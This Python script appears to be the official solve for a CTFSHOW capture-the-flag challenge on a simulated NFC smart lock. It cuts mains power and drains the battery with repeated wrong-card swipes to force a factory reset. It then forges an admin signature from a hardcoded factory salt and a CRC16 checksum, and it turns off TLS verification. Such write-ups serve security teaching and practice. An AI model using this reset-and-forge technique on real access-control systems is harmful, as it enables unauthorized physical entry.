#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CTFSHOW CS2026 - NFC Smart Lock (Official Full Auto Solve)
Author: h1xa

Full flow (stable):
1) GET  /api/challenge -> nonce
2) POST /api/power mains_on=false  (cut mains, switch to battery)
3) POST /api/verify wrong card 20 times (drain battery to 0, device offline)
4) POST /api/power mains_on=true   (restore mains, triggers FACTORY_RESET_OK, nonce rotates)
5) GET  /api/challenge -> new nonce
6) Compute correct sig with salt=123456 and POST /api/verify -> print flag
"""

from __future__ import annotations

import argparse
import sys
import time
from typing import Any, Dict

import requests
import certifi

DEVICE_ID = "LOCK-X36D"
FACTORY_SALT = "123456"
ROLE = "admin"
DRAIN_PER_SWIPE = 5
DRAIN_TIMES = 100 // DRAIN_PER_SWIPE  # 20


def crc16_ccitt_false(data: bytes) -> int:
    crc = 0xFFFF
    for b in data:
        crc ^= (b << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ 0x1021) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc & 0xFFFF


def calc_sig(device_id: str, nonce: str, salt: str, role: str) -> str:
    msg = f"{device_id}|{nonce}|{salt}|{role}".encode("utf-8")
    return f"{crc16_ccitt_false(msg):04X}"


def session_no_proxy() -> requests.Session:
    s = requests.Session()
    s.trust_env = False
    s.proxies = {"http": None, "https": None}
    s.verify = False 
    return s


def get_json(s: requests.Session, url: str, **kw) -> Dict[str, Any]:
    r = s.get(url, timeout=10, **kw)
    r.raise_for_status()
    return r.json()


def post_json(s: requests.Session, url: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    r = s.post(url, json=payload, timeout=10)
    try:
        data = r.json()
    except Exception:
        raise RuntimeError(f"Bad JSON response (HTTP {r.status_code}): {r.text[:200]}")
    return data, r.status_code


def api_challenge(base: str, s: requests.Session) -> Dict[str, Any]:
    return get_json(s, base.rstrip("/") + "/api/challenge")


def api_power(base: str, s: requests.Session, mains_on: bool) -> Dict[str, Any]:
    data, code = post_json(s, base.rstrip("/") + "/api/power", {"mains_on": mains_on})
    if code >= 400 or not data.get("ok"):
        raise RuntimeError(f"/api/power failed: HTTP {code}, body={data}")
    return data


def api_verify(base: str, s: requests.Session, card_payload: Dict[str, Any], lock_nonce: str) -> Dict[str, Any]:
    data, code = post_json(
        s,
        base.rstrip("/") + "/api/verify",
        {"card_payload": card_payload, "lock_nonce": lock_nonce},
    )
    data["_http"] = code
    return data


def pick_nonce(ch: Dict[str, Any]) -> str:
    st = ch.get("state") or {}
    nonce = st.get("nonce") or ch.get("nonce")
    if not nonce:
        raise RuntimeError("nonce missing in /api/challenge response")
    return str(nonce)


def main() -> int:
    ap = argparse.ArgumentParser(description="CTFSHOW NFC smart lock full auto solve")
    ap.add_argument("--base", default="http://127.0.0.1:5000", help="Challenge base URL")
    ap.add_argument("--sleep", type=float, default=0.0, help="sleep between drain swipes (seconds)")
    ap.add_argument("--verbose", action="store_true", help="print progress and server events")
    args = ap.parse_args()

    s = session_no_proxy()
    base = args.base

    def vprint(*a):
        if args.verbose:
            print(*a, file=sys.stderr)

    ch1 = api_challenge(base, s)
    nonce1 = pick_nonce(ch1)
    vprint(f"[*] nonce (initial): {nonce1}")

    p1 = api_power(base, s, mains_on=False)
    vprint("[*] power off events:", p1.get("events", []))
    st = p1.get("state") or {}
    vprint(f"[*] state after power off: mains_on={st.get('mains_on')} battery={st.get('battery')} powered={st.get('powered')}")


    wrong_card = {
        "device_id": DEVICE_ID,
        "nonce": nonce1,   
        "sig": "0000",    
        "role": ROLE
    }

    offline_reached = False
    for i in range(1, DRAIN_TIMES + 1):
        res = api_verify(base, s, wrong_card, lock_nonce=nonce1)

        st = res.get("state") or {}
        reason = res.get("reason")
        events = res.get("events", [])
        vprint(f"[*] drain {i:02d}/{DRAIN_TIMES}: http={res.get('_http')} battery={st.get('battery')} powered={st.get('powered')} reason={reason} events={events}")

        if reason == "OFFLINE" or st.get("powered") is False:
            offline_reached = True
            break

        if args.sleep > 0:
            time.sleep(args.sleep)

    if not offline_reached:
        vprint("[!] battery drain loop finished but device not offline yet; continuing anyway...")

   
    p2 = api_power(base, s, mains_on=True)
    vprint("[*] power on events:", p2.get("events", []))
    st2 = p2.get("state") or {}
    vprint(f"[*] state after power on: mains_on={st2.get('mains_on')} battery={st2.get('battery')} powered={st2.get('powered')} factory_mode={st2.get('factory_mode')} nonce={st2.get('nonce')}")

   
    ch2 = api_challenge(base, s)
    nonce2 = pick_nonce(ch2)
    vprint(f"[*] nonce (after reset): {nonce2}")

    
    sig = calc_sig(DEVICE_ID, nonce2, FACTORY_SALT, ROLE)
    card = {"device_id": DEVICE_ID, "nonce": nonce2, "sig": sig, "role": ROLE}
    vprint("[*] computed sig:", sig)


    final = api_verify(base, s, card, lock_nonce=nonce2)
    if final.get("ok") and final.get("flag"):
        print(final["flag"])
        return 0

    print(f"[!] unlock failed: {final}", file=sys.stderr)
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
